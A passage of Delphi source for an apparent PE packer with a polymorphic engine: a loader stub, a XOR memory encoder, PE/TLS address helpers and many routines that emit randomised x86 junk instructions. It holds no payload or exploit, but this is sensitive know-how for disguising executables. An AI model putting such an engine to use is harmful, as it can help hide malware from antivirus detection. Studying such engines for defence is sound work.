  mov [ebp-048h],012345678h             //ImageSize
  mov [ebp-04Ch],012345678h             //ImageEntryPoint
  mov [ebp-054h],012345678h             //OrgImageSize
  ret
  dd DYN_LOADER_END_MAGIC
end;
procedure DynLoader_end; assembler; asm end;


procedure DynCoder(AAddr:Pointer;ASize:Cardinal;AKey:Pointer); assembler; stdcall;
//this one only smashes a memory a little bit using a key
asm
 @Coder_begin:
  push edi
  push esi

 @Coder_main_loop:
  mov edi,[ebp+008h]            //AAddr
  mov ecx,[ebp+00Ch]            //ASize
  shr ecx,002h
 @Coder_pre_code:
  mov esi,[ebp+010h]            //AKey
 @Coder_code:
  mov eax,[esi]
  test eax,0FF000000h
  jz @Coder_pre_code
 @Coder_do_code:
  add eax,ecx
  xor eax,[edi]                 //smash it
  stosd                         //store it
  inc esi
  loop @Coder_code

 @Coder_end:
  pop esi
  pop edi
  leave
  ret 00Ch
end;

function VirtAddrToPhysAddr(ANtHeaders:PImageNtHeaders;AVirtAddr:Pointer):Pointer;
//this one is to support tls loading mechanism
//returns pointer to raw data in old pe of data on VA specified by AVirtAddr
//or nil if no section contains this data
var
 LI:Integer;
 LPSection:PImageSectionHeader;
 LAddr:Cardinal;
begin
 Result:=nil;
 LAddr:=Cardinal(AVirtAddr)-ANtHeaders^.OptionalHeader.ImageBase;
 LPSection:=Pointer(Cardinal(@ANtHeaders^.OptionalHeader)+ANtHeaders^.FileHeader.SizeOfOptionalHeader);
 for LI:=0 to ANtHeaders^.FileHeader.NumberOfSections-1 do
 begin
  if (LPSection^.VirtualAddress<=Cardinal(LAddr)) and (LPSection^.VirtualAddress+LPSection^.SizeOfRawData>Cardinal(LAddr)) and (LPSection^.SizeOfRawData<>0) then
  begin
   Result:=Pointer(Cardinal(LPSection^.PointerToRawData)+LAddr-LPSection^.VirtualAddress);
   Break;
  end;
  Inc(LPSection);
 end;
end;

function RVA2RAW(ANtHeader,AVirtImage:Pointer;ARVA:Cardinal):Pointer;
//converts RVA to RAW pointer
var
 LPB:PByte;
begin
 Result:=nil;
 LPB:=VirtAddrToPhysAddr(ANtHeader,Pointer(ARVA+PImageNtHeaders(ANtHeader)^.OptionalHeader.ImageBase));
 if LPB=nil then Exit;
 Inc(LPB,Cardinal(AVirtImage));
 Result:=LPB;
end;

function GetTlsCallbacksLen(ACallbacks:Pointer):Cardinal;
//counts size of tls callbacks array 
var
 LPC:PCardinal;
begin
 Result:=4;
 LPC:=ACallbacks;
 while LPC^<>0 do
 begin
  Inc(Result,4);
  Inc(LPC);
 end;
end;

function RoundSize(ASize,AAlignment:Cardinal):Cardinal;
//does rounding up 
begin
 Result:=(ASize+AAlignment-1) div AAlignment*AAlignment;
end;

procedure GenerateRandomBuffer(ABuf:PByte;ASize:Cardinal);
//generates a buffer of pseudo-random values from 1 to 255
var
 LI:Integer;
begin
 for LI:=0 to ASize-1 do
 begin
  ABuf^:=Random($FE)+1;
  Inc(ABuf);
 end;
end;

procedure GenerateKey(AKey:PByte;ASize:Word);
//generetes a key for encoding data
//key is pseudo-random buffer ending with 0
begin
 GenerateRandomBuffer(AKey,ASize);
 PByte(Cardinal(AKey)+Cardinal(ASize)-1)^:=0;
end;

procedure ThrowTheDice(var ADice:Cardinal;ASides:Cardinal=6); overload;
//throw the dice
begin
 ADice:=Random(ASides)+1;
end;

procedure ThrowTheDice(var ADice:Word;ASides:Word=6); overload;
//throw the dice
begin
 ADice:=Random(ASides)+1;
end;

procedure ThrowTheDice(var ADice:Byte;ASides:Byte=6); overload;
//throw the dice
begin
 ADice:=Random(ASides)+1;
end;

function RandomReg32All:Byte;
//select one of eax,ecx,edx,ebx,esp,ebp,esi,edi
begin
 Result:=Random(Reg32Count);
end;

function RandomReg16All:Byte;
//select one of ax,cx,dx,bx,sp,bp,si,di
begin
 Result:=Random(Reg16Count);
end;

function RandomReg8ABCD:Byte;
//select one of al,cl,dl,bl,ah,ch,dh,bh
begin
 Result:=Random(Reg8Count);
end;

function RandomReg32Esp:Byte;
//select one of eax,ecx,edx,ebx,-,ebp,esi,edi
begin
 Result:=Random(Reg32Count-1);
 if Result=REG_ESP then Result:=7;
end;

function RandomReg32EspEbp:Byte;
//select one of eax,ecx,edx,ebx,-,-,esi,edi
begin
 Result:=Random(Reg32Count-2);
 if Result=REG_ESP then Result:=6
 else if Result=REG_EBP then Result:=7;
end;

procedure PutRandomBuffer(var AMem:PByte;ASize:Cardinal);
begin
 GenerateRandomBuffer(AMem,ASize);
 Inc(AMem,ASize);
end;

function Bswap(var AMem:PByte;AReg:Byte):Byte;
begin
 Result:=2;
 AMem^:=$0F;                           //bswap
 Inc(AMem);
 AMem^:=$C8+AReg;                      //reg32
 Inc(AMem);
end;

function Pushad(var AMem:PByte):Byte;
begin
 Result:=1;
 AMem^:=$60;
 Inc(AMem);
end;

function Stosd(var AMem:PByte):Byte;
begin
 Result:=1;
 AMem^:=$AB;                           //stosd
 Inc(AMem);
end;

function Movsd(var AMem:PByte):Byte;
begin
 Result:=1;
 AMem^:=$A5;                           //movsd
 Inc(AMem);
end;

function Ret(var AMem:PByte):Byte;
begin
 Result:=1;
 AMem^:=$C3;                           //ret
 Inc(AMem);
end;

procedure Ret16(var AMem:PByte;AVal:Word);
begin
 AMem^:=$C2;                           //ret
 Inc(AMem);
 PWord(AMem)^:=AVal;                   //retval
 Inc(AMem,2);
end;

procedure RelJmpAddr32(var AMem:PByte;AAddr:Cardinal);
begin
 AMem^:=$E9;                           //jmp
 Inc(AMem);
 PCardinal(AMem)^:=AAddr;
 Inc(AMem,4);
end;

procedure RelJmpAddr8(var AMem:PByte;AAddr:Byte);
begin
 AMem^:=$EB;                           //jmp
 Inc(AMem);
 AMem^:=AAddr;                         //Addr8
 Inc(AMem);
end;


procedure RelJzAddr32(var AMem:PByte;AAddr:Cardinal);
begin
 AMem^:=$0F;                           //conditional jump
 Inc(AMem);
 AMem^:=$84;                           //if zero
 Inc(AMem);
 PCardinal(AMem)^:=AAddr;
 Inc(AMem,4);
end;

procedure RelJnzAddr32(var AMem:PByte;AAddr:Cardinal);
begin
 AMem^:=$0F;                           //conditional jump
 Inc(AMem);
 AMem^:=$85;                           //if not zero
 Inc(AMem);
 PCardinal(AMem)^:=AAddr;
 Inc(AMem,4);
end;

procedure RelJbAddr32(var AMem:PByte;AAddr:Cardinal);
begin
 AMem^:=$0F;                           //conditional jump
 Inc(AMem);
 AMem^:=$82;                           //if below
 Inc(AMem);
 PCardinal(AMem)^:=AAddr;
 Inc(AMem,4);
end;

procedure RelJzAddr8(var AMem:PByte;AAddr:Byte);
begin
 AMem^:=$74;                           //jz
 Inc(AMem);
 AMem^:=AAddr;                         //addr8
 Inc(AMem);
end;

procedure RelJnzAddr8(var AMem:PByte;AAddr:Byte);
begin
 AMem^:=$75;                           //jnz
 Inc(AMem);
 AMem^:=AAddr;                         //addr8
 Inc(AMem);
end;

function JmpRegMemIdx8(var AMem:PByte;AReg,AIdx:Byte):Byte;
begin
 Result:=3;
 AMem^:=$FF;                           //jmp
 Inc(AMem);
 AMem^:=$60+AReg;                      //regmem
 InC(AMem);
 if AReg=REG_ESP then
 begin
  Inc(Result);
  AMem^:=$24;                          //esp
  Inc(AMem);
 end;
 AMem^:=AIdx;                          //idx8
 Inc(AMem);
end;

function PushRegMem(var AMem:PByte;AReg:Byte):Byte;
begin
 Result:=2;
 AMem^:=$FF;                           //push
 Inc(AMem);
 if AReg=REG_EBP then
 begin
  Inc(Result);
  AMem^:=$75;                          //ebp
  Inc(AMem);
  AMem^:=$00;                          //+0
 end else AMem^:=$30+AReg;             //regmem
 Inc(AMem);
 if AReg=REG_ESP then
 begin
  Inc(Result);
  AMem^:=$24;                          //esp
  Inc(AMem);
 end;
end;

procedure PushReg32(var AMem:PByte;AReg:Byte);
begin
 AMem^:=$50+AReg;                      //push reg
 Inc(AMem);
end;

function PushReg32Rand(var AMem:PByte):Byte;
begin
 Result:=RandomReg32Esp;
 PushReg32(AMem,Result);
end;

procedure PopReg32(var AMem:PByte;AReg:Byte);
begin
 AMem^:=$58+AReg;                      //pop reg
 Inc(AMem);
end;

function PopReg32Idx(var AMem:PByte;AReg:Byte;AIdx:Cardinal):Byte;
begin
 Result:=6;
 AMem^:=$8F;                           //pop
 Inc(AMem);
 AMem^:=$80+AReg;                      //reg32
 Inc(AMem);
 if AReg=REG_ESP then
 begin
  AMem^:=$24;                          //esp
  Inc(AMem);
  Inc(Result);
 end;
 PCardinal(AMem)^:=AIdx;               //+ idx
 InC(AMem,4);
end;

procedure RelCallAddr(var AMem:PByte;AAddr:Cardinal);
begin
 AMem^:=$E8;                           //call
 Inc(AMem);
 PCardinal(AMem)^:=AAddr;              //Addr
 Inc(AMem,4);
end;

procedure MovReg32Reg32(var AMem:PByte;AReg1,AReg2:Byte);
begin
 AMem^:=$89;                           //mov
 Inc(AMem);
 AMem^:=AReg2*8+AReg1+$C0;             //reg32,reg32
 Inc(AMem);
end;

procedure AddReg32Reg32(var AMem:PByte;AReg1,AReg2:Byte);
begin
 AMem^:=$01;                           //add
 Inc(AMem);
 AMem^:=AReg2*8+AReg1+$C0;             //reg32,reg32
 Inc(AMem);
end;

function AddReg32RegMem(var AMem:PByte;AReg1,AReg2:Byte):Byte;
begin
 Result:=2;
 AMem^:=$03;                           //add
 Inc(AMem);
 if AReg2=REG_EBP then
 begin
  Inc(Result);
  AMem^:=AReg1*8+$45;                  //reg32,ebp
  Inc(AMem);
  AMem^:=$00;                          //+0
 end else AMem^:=AReg1*8+AReg2;        //reg32,regmem
 Inc(AMem);
 if AReg2=REG_ESP then
 begin
  Inc(Result);
  AMem^:=$24;                          //esp
  Inc(AMem);
 end;
end;

function AddRegMemReg32(var AMem:PByte;AReg1,AReg2:Byte):Byte;
begin
 Result:=2;
 AMem^:=$01;                           //add
 Inc(AMem);
 if AReg1=REG_EBP then
 begin
  Inc(Result);
  AMem^:=AReg2*8+$45;                  //regmem,ebp
  Inc(AMem);
  AMem^:=$00;                          //+0
 end else AMem^:=AReg2*8+AReg1;        //regmem,reg
 Inc(AMem);
 if AReg1=REG_ESP then
 begin
  Inc(Result);
  AMem^:=$24;                          //esp
  Inc(AMem);
 end;
end;



procedure AddReg32Num8(var AMem:PByte;AReg,ANum:Byte);
begin
 AMem^:=$83;                           //add
 Inc(AMem);
 AMem^:=$C0+AReg;                      //reg32
 Inc(AMem);
 AMem^:=ANum;                          //num8
 Inc(AMem);
end;

procedure MovReg32Num32(var AMem:PByte;AReg:Byte;ANum:Cardinal);
begin
 AMem^:=$B8+AReg;                      //mov reg32
 Inc(AMem);
 PCardinal(AMem)^:=ANum;               //num32
 Inc(AMem,4);
end;

function MovReg32IdxNum32(var AMem:PByte;AReg:Byte;AIdx,ANum:Cardinal):Byte;
begin
 Result:=10;
 AMem^:=$C7;                           //mov
 Inc(AMem);
 AMem^:=$80+AReg;                      //reg32
 Inc(AMem);
 if AReg=REG_ESP then
 begin
  Inc(Result);
  AMem^:=$24;                          //esp
  Inc(AMem);
 end;
 PCardinal(AMem)^:=AIdx;               //+ idx
 Inc(AMem,4);
 PCardinal(AMem)^:=ANum;               //Num32
 Inc(AMem,4);
end;

procedure MovReg32Reg32IdxNum32(var AMem:PByte;AReg1,AReg2:Byte;ANum:Cardinal);
//both AReg must not be REG_ESP or REG_EBP
begin
 if AReg1=REG_ESP then begin AReg1:=AReg2; AReg2:=REG_ESP; end;
 if AReg2=REG_EBP then begin AReg2:=AReg1; AReg1:=REG_EBP; end;
 AMem^:=$C7;                           //mov
 Inc(AMem);
 AMem^:=$04;
 Inc(AMem);
 AMem^:=AReg1*8+AReg2;
 Inc(AMem);
 PCardinal(AMem)^:=ANum;               //Num32
 Inc(AMem,4);
end;

function MovReg32RegMem(var AMem:PByte;AReg1,AReg2:Byte):Byte;
begin
 Result:=2;
 AMem^:=$8B;                           //mov
 Inc(AMem);
 if AReg2=REG_EBP then
 begin
  Inc(Result);
  AMem^:=AReg1*8+$45;                  //reg32,ebp
  Inc(AMem);
  AMem^:=$00;                          //+0
 end else AMem^:=AReg1*8+AReg2;        //reg32,regmem
 Inc(AMem);
 if AReg2=REG_ESP then
 begin
  Inc(Result);
  AMem^:=$24;                          //esp
  Inc(AMem);
 end;
end;

function MovRegMemReg32(var AMem:PByte;AReg1,AReg2:Byte):Byte;
begin
 Result:=2;
 AMem^:=$89;                           //mov
 Inc(AMem);
 if AReg1=REG_EBP then
 begin
  Inc(Result);
  AMem^:=AReg2*8+$45;                  //reg32,ebp
  Inc(AMem);
  AMem^:=$00;                          //+0
 end else AMem^:=AReg2*8+AReg1;        //reg32,regmem
 Inc(AMem);
 if AReg1=REG_ESP then
 begin
  Inc(Result);
  AMem^:=$24;                          //esp
  Inc(AMem);
 end;
end;

function MovReg32RegMemIdx8(var AMem:PByte;AReg1,AReg2,AIdx:Byte):Byte;
begin
 Result:=3;
 AMem^:=$8B;                           //mov
 Inc(AMem);
 AMem^:=AReg1*8+AReg2+$40;             //AReg1,AReg2
 Inc(AMem);
 if AReg2=REG_ESP then
 begin
  Inc(Result);
  AMem^:=$24;                          //esp
  Inc(AMem);
 end;
 AMem^:=AIdx;                          //AIdx
 Inc(AMem);
end;

procedure PushNum32(var AMem:PByte;ANum:Cardinal);
begin
 AMem^:=$68;                           //push
 Inc(AMem);
 PCardinal(AMem)^:=ANum;
 Inc(AMem,4);
end;

procedure JmpReg32(var AMem:PByte;AReg:Byte);
begin
 AMem^:=$FF;                           //jmp | call
 Inc(AMem);
 AMem^:=$E0+AReg;                      //reg32
 Inc(AMem);
end;

procedure CallReg32(var AMem:PByte;AReg:Byte);
begin
 AMem^:=$FF;                           //jmp | call
 Inc(AMem);
 AMem^:=$D0+AReg;                      //reg32
 Inc(AMem);
end;

procedure Cld(var AMem:PByte);
begin
 AMem^:=$FC;                           //cld
 Inc(AMem);
end;

procedure Std(var AMem:PByte);
begin
 AMem^:=$FD;                           //std
 Inc(AMem);
end;

procedure Nop(var AMem:PByte);
begin
 AMem^:=$90;                           //nop
 Inc(AMem);
end;

procedure Stc(var AMem:PByte);
begin
 AMem^:=$F9;                           //stc
 Inc(AMem);
end;

procedure Clc(var AMem:PByte);
begin
 AMem^:=$F8;                           //clc
 Inc(AMem);
end;

procedure Cmc(var AMem:PByte);
begin
 AMem^:=$F5;                           //cmc
 Inc(AMem);
end;

procedure XchgReg32Rand(var AMem:PByte);
begin
 AMem^:=$87;                           //xchg
 Inc(AMem);
 AMem^:=$C0+RandomReg32All*9;          //reg32
 Inc(AMem);
end;

function XchgReg32Reg32(var AMem:PByte;AReg1,AReg2:Byte):Byte;
begin
 if AReg2=REG_EAX then begin AReg2:=AReg1; AReg1:=REG_EAX end;
 if AReg1=REG_EAX then ThrowTheDice(Result,2)
 else Result:=2;
 if Result=2 then
 begin
  AMem^:=$87;                          //xchg
  Inc(AMem);
  AMem^:=$C0+AReg2*8+AReg1;            //reg32
 end else AMem^:=$90+AReg2;            //xchg eax,reg32
 Inc(AMem);
end;

procedure MovReg32Rand(var AMem:PByte);
begin
 AMem^:=$8B;                           //mov
 Inc(AMem);
 AMem^:=$C0+RandomReg32All*9;          //reg32
 Inc(AMem);
end;

procedure IncReg32(var AMem:PByte;AReg:Byte);
begin
 AMem^:=$40+AReg;                      //inc reg32
 Inc(AMem);
end;

procedure DecReg32(var AMem:PByte;AReg:Byte);
begin
 AMem^:=$48+AReg;                      //dec reg32
 Inc(AMem);
end;

function IncReg32Rand(var AMem:PByte):Byte;
begin
 Result:=RandomReg32All;
 IncReg32(AMem,Result);
end;

function DecReg32Rand(var AMem:PByte):Byte;
begin
 Result:=RandomReg32All;
 DecReg32(AMem,Result);
end;

function LeaReg32Reg32(var AMem:PByte;AReg1,AReg2:Byte):Byte;
begin
 Result:=2;
 AMem^:=$8D;                           //mov
 Inc(AMem);
 if AReg2=REG_EBP then
 begin
  Inc(Result);
  AMem^:=AReg1*8+$45;                  //reg32,ebp
  Inc(AMem);
  AMem^:=$00;                          //+0
 end else AMem^:=AReg1*8+AReg2;        //reg32,regmem
 Inc(AMem);
 if AReg2=REG_ESP then
 begin
  Inc(Result);
  AMem^:=$24;                          //esp
  Inc(AMem);
 end;
end;

function LeaReg32Reg32MemIdx8(var AMem:PByte;AReg1,AReg2,AIdx:Byte):Byte;
begin
 Result:=3;
 AMem^:=$8D;                           //lea
 Inc(AMem);
 AMem^:=$40+AReg1*8+AReg2;             //reg32,reg32mem
 Inc(AMem);
 if AReg2=REG_ESP then
 begin
  Inc(Result);
  AMem^:=$24;                          //esp
  Inc(AMem);
 end;
 AMem^:=AIdx;                          //idx8
 Inc(AMem);
end;

procedure LeaReg32Rand(var AMem:PByte);
begin
 AMem^:=$8D;                           //lea
 Inc(AMem);
 AMem^:=$00+RandomReg32EspEbp*9;       //reg32
 Inc(AMem);
end;

procedure LeaReg32Addr32(var AMem:PByte;AReg,AAddr:Cardinal);
begin
 AMem^:=$8D;                           //lea
 Inc(AMem);
 AMem^:=$05+AReg*8;                    //reg32
 Inc(AMem);
 PCardinal(AMem)^:=AAddr;              //addr32
 Inc(AMem,4);
end;


procedure TestReg32Rand(var AMem:PByte);
begin
 AMem^:=$85;                           //test
 Inc(AMem);
 AMem^:=$C0+RandomReg32All*9;          //reg32
 Inc(AMem);
end;

procedure OrReg32Rand(var AMem:PByte);
begin
 AMem^:=$0B;                           //or
 Inc(AMem);
 AMem^:=$C0+RandomReg32All*9;          //reg32
 Inc(AMem);
end;

procedure AndReg32Rand(var AMem:PByte);
begin
 AMem^:=$23;                           //and
 Inc(AMem);
 AMem^:=$C0+RandomReg32All*9;          //reg32
 Inc(AMem);
end;

procedure TestReg8Rand(var AMem:PByte);
var
 LReg8:Byte;
begin
 LReg8:=RandomReg8ABCD;
 AMem^:=$84;                           //test
 Inc(AMem);
 AMem^:=$C0+LReg8*9;                  //reg8
 Inc(AMem);
end;

procedure OrReg8Rand(var AMem:PByte);
var
 LReg8:Byte;
begin
 LReg8:=RandomReg8ABCD;
 AMem^:=$0A;                           //or
 Inc(AMem);
 AMem^:=$C0+LReg8*9;                   //reg8
 Inc(AMem);
end;

procedure AndReg8Rand(var AMem:PByte);
var
 LReg8:Byte;
begin
 LReg8:=RandomReg8ABCD;
 AMem^:=$22;                           //and
 Inc(AMem);
 AMem^:=$C0+LReg8*9;                   //reg8
 Inc(AMem);
end;

procedure CmpRegRegNum8Rand(var AMem:PByte);
var
 LRnd:Byte;
begin
 LRnd:=Random(3);
 AMem^:=$3A+LRnd;                      //cmp
 Inc(AMem);
 if LRnd<2 then LRnd:=Random($40)+$C0
 else LRnd:=Random($100);
 AMem^:=LRnd;                          //reg16 | reg32 | num16
 Inc(AMem);
end;

function CmpReg32Reg32(var AMem:Pbyte;AReg1,AReg2:Byte):Byte;
begin
 Result:=2;
 AMem^:=$39;                           //cmp
 Inc(AMem);
 AMem^:=$C0+AReg1+AReg2*8;             //reg1,reg2            
 Inc(AMem);
end;

procedure CmpReg32Num8(var AMem:PByte;AReg,ANum:Byte);
begin
 AMem^:=$83;                           //cmp
 Inc(AMem);
 AMem^:=$F8+AReg;                      //reg32
 Inc(AMem);
 AMem^:=ANum;                          //num8
 Inc(AMem);
end;

procedure CmpReg32RandNum8(var AMem:PByte;AReg:Byte);
begin
 CmpReg32Num8(AMem,AReg,Random($100));
end;

procedure CmpRandReg32RandNum8(var AMem:PByte);
begin
 CmpReg32RandNum8(AMem,RandomReg32All);
end;

procedure JmpNum8(var AMem:PByte;ANum:Byte);
var
 LRnd:Byte;
begin
 LRnd:=Random(16);
 if LRnd=16 then AMem^:=$EB            //jmp
 else AMem^:=$70+LRnd;                 //cond jmp
 Inc(AMem);
 AMem^:=ANum;                          //num8
 Inc(AMem);
end;

procedure SubReg32Reg32(var AMem:PByte;AReg1,AReg2:Byte);
begin
 AMem^:=$29;                           //sub
 Inc(AMem);
 AMem^:=AReg2*8+AReg1+$C0;             //reg32,reg32
 Inc(AMem);
end;


procedure SubReg32Num8(var AMem:PByte;AReg,ANum:Byte);
begin
 AMem^:=$83;                           //sub
 Inc(AMem);
 AMem^:=$E8+AReg;                      //reg32
 Inc(AMem);
 AMem^:=ANum;                          //num8
 Inc(AMem);
end;

function SubReg32Num8Rand(var AMem:PByte;ANum:Byte):Byte;
begin
 Result:=RandomReg32All;
 SubReg32Num8(AMem,Result,ANum);
end;

function AddReg32Num8Rand(var AMem:PByte;ANum:Byte):Byte;
begin
 Result:=RandomReg32All;
 AddReg32Num8(AMem,Result,ANum);
end;

procedure SubAlNum8(var AMem:PByte;ANum:Byte);
begin
 AMem^:=$2C;                           //sub al
 Inc(AMem);
 AMem^:=ANum;                          //num8
 Inc(AMem);
end;

procedure TestAlNum8(var AMem:PByte;ANum:Byte);
begin
 AMem^:=$A8;                           //test al
 Inc(AMem);
 AMem^:=ANum;                          //num8
 Inc(AMem);
end;

procedure TestAlNum8Rand(var AMem:PByte);
begin
 TestAlNum8(AMem,Random($100));
end;

procedure SubReg8Num8(var AMem:PByte;AReg,ANum:Byte);
begin
 AMem^:=$80;                           //sub
 Inc(AMem);
 AMem^:=$E8+AReg;                      //reg8
 Inc(AMem);
 AMem^:=ANum;                          //num8
 Inc(AMem);
end;

procedure SubReg8Num8Rand(var AMem:PByte;ANum:Byte);
var
 LReg8:Byte;
begin
 LReg8:=RandomReg8ABCD;
 SubReg8Num8(AMem,LReg8,ANum);
end;

procedure TestReg8Num8(var AMem:PByte;AReg,ANum:Byte);
begin
 AMem^:=$F6;                           //test
 Inc(AMem);
 AMem^:=$C0+AReg;                      //reg8
 Inc(AMem);
 AMem^:=ANum;                          //num8
 Inc(AMem);
end;

procedure TestReg8Num8Rand(var AMem:PByte);
begin
 TestReg8Num8(AMem,RandomReg8ABCD,Random($100));
end;

procedure AddReg8Num8(var AMem:PByte;AReg,ANum:Byte);
begin
 AMem^:=$80;                           //add
 Inc(AMem);
 AMem^:=$C0+AReg;                      //reg8
 Inc(AMem);
 AMem^:=ANum;                          //num8
 Inc(AMem);
end;

procedure AddReg8Num8Rand(var AMem:PByte;ANum:Byte);
var
 LReg8:Byte;
begin
 LReg8:=RandomReg8ABCD;
 AddReg8Num8(AMem,LReg8,ANum);
end;

procedure AddAlNum8(var AMem:PByte;ANum:Byte);
begin
 AMem^:=$04;                           //add al
 Inc(AMem);
 AMem^:=ANum;                          //num8
 Inc(AMem);
end;

procedure FNop(var AMem:PByte);
begin
 AMem^:=$D9;                           //fnop
 Inc(AMem);
 AMem^:=$D0;
 Inc(AMem);
end;

procedure OrReg16Rand(var AMem:PByte);
var
 LReg16:Byte;
begin
 LReg16:=RandomReg16All;
 AMem^:=$66;                           //or | test | and
 Inc(AMem);
 AMem^:=$0B;
 Inc(AMem);
 AMem^:=$C0+LReg16*9;                  //reg16
 Inc(AMem);
end;

procedure TestReg16Rand(var AMem:PByte);
var
 LReg16:Byte;
begin
 LReg16:=RandomReg16All;
 AMem^:=$66;                           //or | test | and
 Inc(AMem);
 AMem^:=$85;
 Inc(AMem);
 AMem^:=$C0+LReg16*9;                  //reg16
 Inc(AMem);
end;

procedure AndReg16Rand(var AMem:PByte);
var
 LReg16:Byte;
begin
 LReg16:=RandomReg16All;
 AMem^:=$66;                           //or | test | and
 Inc(AMem);
 AMem^:=$23;
 Inc(AMem);
 AMem^:=$C0+LReg16*9;                  //reg16
 Inc(AMem);
end;

procedure Cdq(var AMem:PByte);
begin
 AMem^:=$99;
 Inc(AMem);
end;

procedure ShlReg32Num8(var AMem:PByte;AReg,ANum:Byte);
begin
 AMem^:=$C1;                           //shl | shr | sal | sar
 Inc(AMem);
 AMem^:=$E0+AReg;                      //reg32
 Inc(AMem);
 AMem^:=ANum;                          //num8
 Inc(AMem);
end;

procedure ShlReg32RandNum8FullRand(var AMem:PByte);
begin
 ShlReg32Num8(AMem,RandomReg32All,Random(8)*$20);
end;

procedure ShrReg32Num8(var AMem:PByte;AReg,ANum:Byte);
begin
 AMem^:=$C1;                           //shl | shr | sal | sar
 Inc(AMem);
 AMem^:=$E8+AReg;                      //reg32
 Inc(AMem);
 AMem^:=ANum;                          //num8
 Inc(AMem);
end;

procedure ShrReg32RandNum8FullRand(var AMem:PByte);
begin
 ShrReg32Num8(AMem,RandomReg32All,Random(8)*$20);
end;

procedure SalReg32Num8(var AMem:PByte;AReg,ANum:Byte);
begin
 AMem^:=$C1;                           //shl | shr | sal | sar
 Inc(AMem);
 AMem^:=$F0+AReg;                      //reg32
 Inc(AMem);
 AMem^:=ANum;                          //num8
 Inc(AMem);
end;

procedure SalReg32RandNum8FullRand(var AMem:PByte);
begin
 SalReg32Num8(AMem,RandomReg32All,Random(8)*$20);
end;

procedure SarReg32Num8(var AMem:PByte;AReg,ANum:Byte);
begin
 AMem^:=$C1;                           //shl | shr | sal | sar
 Inc(AMem);
 AMem^:=$F8+AReg;                      //reg32
 Inc(AMem);
 AMem^:=ANum;                          //num8
 Inc(AMem);
end;

procedure SarReg32RandNum8FullRand(var AMem:PByte);
begin
 SarReg32Num8(AMem,RandomReg32All,Random(8)*$20);
end;

procedure RolReg8Num8(var AMem:PByte;AReg,ANum:Byte);
begin
 AMem^:=$C0;                           //rol | ror
 Inc(AMem);
 AMem^:=$C0+AReg;                      //reg8
 Inc(AMem);
 AMem^:=ANum;                          //num8
 Inc(AMem);
end;

procedure RolReg8RandNum8FullRand(var AMem:PByte);
begin
 RolReg8Num8(AMem,RandomReg8ABCD,Random($20)*8);
end;

procedure RorReg8Num8(var AMem:PByte;AReg,ANum:Byte);
begin
 AMem^:=$C0;                           //rol | ror
 Inc(AMem);
 AMem^:=$C8+AReg;                      //reg8
 Inc(AMem);
 AMem^:=ANum;                          //num8
 Inc(AMem);
end;

procedure RorReg8RandNum8FullRand(var AMem:PByte);
begin
 RorReg8Num8(AMem,RandomReg8ABCD,Random($20)*8);
end;

procedure RolReg32Num8(var AMem:PByte;AReg,ANum:Byte);
begin
 AMem^:=$C1;                           //rol | ror
 Inc(AMem);
 AMem^:=$C0+AReg;                      //reg32
 Inc(AMem);
 AMem^:=ANum;                          //num8
 Inc(AMem);
end;

procedure RolReg32RandNum8FullRand(var AMem:PByte);
begin
 RolReg32Num8(AMem,RandomReg32All,Random(8)*$20);
end;

procedure RorReg32Num8(var AMem:PByte;AReg,ANum:Byte);
begin
 AMem^:=$C1;                           //rol | ror
 Inc(AMem);
 AMem^:=$C8+AReg;                      //reg32
 Inc(AMem);
 AMem^:=ANum;                          //num8
 Inc(AMem);
end;

procedure RorReg32RandNum8FullRand(var AMem:PByte);
begin
 RorReg32Num8(AMem,RandomReg32All,Random(8)*$20);
end;

procedure TestAxNum16(var AMem:PByte;ANum:Word);
begin
 AMem^:=$66;                           //test ax
 Inc(AMem);
 AMem^:=$A9;
 Inc(AMem);
 PWord(AMem)^:=ANum;                   //num16
 Inc(AMem,2);
end;

procedure TestAxNum16Rand(var AMem:PByte);
begin
 TestAxNum16(AMem,Random($10000));
end;

procedure CmpAxNum16(var AMem:PByte;ANum:Word);
begin
 AMem^:=$66;                           //cmp ax
 Inc(AMem);
 AMem^:=$3D;
 Inc(AMem);
 PWord(AMem)^:=ANum;                   //num16
 Inc(AMem,2);
end;

procedure CmpAxNum16Rand(var AMem:PByte);
begin
 TestAxNum16(AMem,Random($10000));
end;

procedure PushNum8(var AMem:PByte;ANum:Byte);
begin
 AMem^:=$6A;                           //push
 Inc(AMem);
 AMem^:=ANum;                          //num8
 Inc(AMem);
end;

procedure PushNum8Rand(var AMem:PByte);
begin
 PushNum8(AMem,Random($100));
end;

function XorRand(var AMem:PByte):Word;
var
 LRnd:Byte;
 LRes:PWord;
begin
 LRes:=Pointer(AMem);
 LRnd:=Random(5);
 AMem^:=$30+LRnd;                      //xor
 Inc(AMem);
 if LRnd=4 then AMem^:=Random($100)    //num8
 else AMem^:=Random(7)*9+Random(8)+1+$C0;      //reg8 | reg32 but never the same reg
 Inc(AMem);
 Result:=LRes^;
end;

procedure InvertXor(var AMem:PByte;AXor:Word);
begin
 PWord(AMem)^:=AXor;
 Inc(AMem,2);
end;

procedure DoubleXorRand(var AMem:PByte);
begin
 InvertXor(AMem,XorRand(AMem));
end;

function NotReg32(var AMem:PByte;AReg:Byte):Byte;
begin
 Result:=2;
 AMem^:=$F7;                           //not
 Inc(AMem);
 AMem^:=$D0+AReg;                      //reg32
 Inc(AMem);
end;

function NegReg32(var AMem:PByte;AReg:Byte):Byte;
begin
 Result:=2;
 AMem^:=$F7;                           //not
 Inc(AMem);
 AMem^:=$D8+AReg;                      //reg32
 Inc(AMem);
end;

function NotRand(var AMem:PByte):Word;
var
 LRes:PWord;
begin
 LRes:=Pointer(AMem);
 AMem^:=$F6+Random(1);                 //not
 Inc(AMem);
 AMem^:=$D0+Random(8);                 //reg8 | reg32
 Inc(AMem);
 Result:=LRes^;
end;

procedure InvertNot(var AMem:PByte;ANot:Word);
begin
 PWord(AMem)^:=ANot;
 Inc(AMem,2);
end;

procedure DoubleNotRand(var AMem:PByte);
begin
 InvertNot(AMem,NotRand(AMem));
end;

function NegRand(var AMem:PByte):Word;
var
 LRes:PWord;
begin
 LRes:=Pointer(AMem);
 AMem^:=$F6+Random(1);                 //neg
 Inc(AMem);
 AMem^:=$D8+Random(8);                 //reg8 | reg32
 Inc(AMem);
 Result:=LRes^;
end;

procedure InvertNeg(var AMem:PByte;ANeg:Word);
begin
 PWord(AMem)^:=ANeg;
 Inc(AMem,2);
end;

procedure DoubleNegRand(var AMem:PByte);
begin
 InvertNeg(AMem,NegRand(AMem));
end;

procedure AddReg16Num8(var AMem:PByte;AReg,ANum:Byte);
begin
 AMem^:=$66;                           //add | or | and | sub | xor | cmp
 Inc(AMem);
 AMem^:=$83;
 Inc(AMem);
